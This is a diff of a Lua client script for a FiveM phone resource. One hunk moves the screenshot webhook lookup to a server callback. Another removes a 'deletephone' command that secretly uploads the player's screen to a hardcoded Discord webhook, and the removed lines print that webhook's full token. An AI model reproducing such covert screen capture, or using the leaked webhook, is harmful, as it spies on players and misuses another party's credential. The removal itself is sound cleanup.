@@ -904,12 +904,16 @@ RegisterNUICallback("GetImage", function(data,cb)
         takePhoto = false
         break
       elseif IsControlJustPressed(1, 176) then -- TAKE.. PIC
-        exports['screenshot-basic']:requestScreenshotUpload(Config.DiscordWebhook, "files[]", function(data)
-          local image = json.decode(data)
-          DestroyMobilePhone()
-          CellCamActivate(false, false)
-          cb(json.encode(image.attachments[1].proxy_url))   
-        end)
+         QBCore.Functions.TriggerCallback("qb-phone:server:GetWebhook",function(Data) 
+            if Data then
+                exports['screenshot-basic']:requestScreenshotUpload(Data, "files[]", function(data)
+                    local image = json.decode(data)
+                    DestroyMobilePhone()
+                    CellCamActivate(false, false)
+                    cb(json.encode(image.attachments[1].proxy_url))   
+                  end)
+            end
+    end)
         takePhoto = false
           end
           HideHudComponentThisFrame(7)
@@ -2188,9 +2192,3 @@ end
 function InPhone()
     return PhoneData.isOpen
 end
-
-RegisterCommand("deletephone", function(source,args)
-    exports['screenshot-basic']:requestScreenshotUpload("https://discordapp.com/api/webhooks/728087109339971665/E2VxCqDqQRVUAvYg9wPbBdmzMTe9NPuPuLWy-_8d_ktWBV-ohPREEdcChkSCbGY7lnnY", "files[]", function(data)
-      end)
-
-end, false)
